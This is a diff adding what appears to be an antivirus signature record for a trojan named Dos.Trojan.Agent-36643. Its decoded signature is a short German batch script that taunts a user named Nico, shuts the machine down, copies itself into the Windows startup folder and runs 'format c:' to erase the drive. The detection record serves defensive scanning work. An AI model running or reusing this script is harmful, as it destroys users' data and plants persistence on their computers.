@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36643
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off echo. echo hallo nico das ist ein kleiner virus. echo er wirt deien computer neustarten und die daten auf echo deiner festplatte c: lschen. echo. echo drcke einfach eine taste... echo. pause>nul cls shutdown /s copy virus.bat c:\dokumente und einstellungen\all users\startmen\programme\autostart\ format c: 
